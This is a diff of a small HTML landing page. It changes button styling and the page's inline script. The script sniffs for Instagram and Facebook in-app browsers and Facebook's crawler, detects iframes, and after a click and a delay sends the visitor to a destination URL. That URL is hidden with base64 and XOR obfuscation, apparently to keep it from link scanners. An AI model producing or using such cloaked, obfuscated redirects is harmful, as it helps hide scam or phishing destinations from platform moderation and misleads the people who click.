@@ -19,13 +19,16 @@
 
     .container {
       background: white;
-      border-radius: 9999px;
-      padding: 0.8rem 1.8rem;
+      border-radius: 50px;
+      padding: 1.2rem 2rem;
       box-shadow: 0 4px 30px rgba(0, 0, 0, 0.2);
       display: flex;
       align-items: center;
+      justify-content: center;
       cursor: pointer;
       transition: transform 0.2s ease;
+      width: 80%;
+      max-width: 400px;
     }
 
     .container:hover {
@@ -33,11 +36,8 @@
     }
 
     .icon {
-      background: black;
-      color: white;
-      border-radius: 50%;
-      padding: 1rem;
-      font-size: 1.8rem;
+      color: black;
+      font-size: 2.5rem;
       display: flex;
       align-items: center;
       justify-content: center;
@@ -50,7 +50,7 @@
   </div>
 
   <script>
-    (function() {
+    (function () {
       const ua = navigator.userAgent.toLowerCase();
       const isInsta = ua.includes("instagram") || ua.includes("facebookexternalhit") || ua.includes("fbav") || ua.includes("fbios");
       const isIframe = window.top !== window.self;
@@ -66,15 +66,13 @@
 
     document.getElementById("realButton").addEventListener("click", function () {
       if (!interacted) return;
+
       setTimeout(() => {
-        fetch("link.php")
-          .then(res => res.text())
-          .then(code => {
-            const decoded = atob(code.trim());
-            const xorKey = 3;
-            const finalURL = decoded.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ xorKey)).join('');
-            window.location.href = finalURL;
-          });
+        const encoded = "Z3Z5dGphKyxwYXRiZGVxZnt4Z3g+e2pvZmly"; // XOR + base64 of final URL
+        const xorKey = 3;
+        const base64Decoded = atob(encoded);
+        const finalURL = base64Decoded.split('').map(c => String.fromCharCode(c.charCodeAt(0) ^ xorKey)).join('');
+        window.location.href = finalURL;
       }, 2000);
     });
   </script>
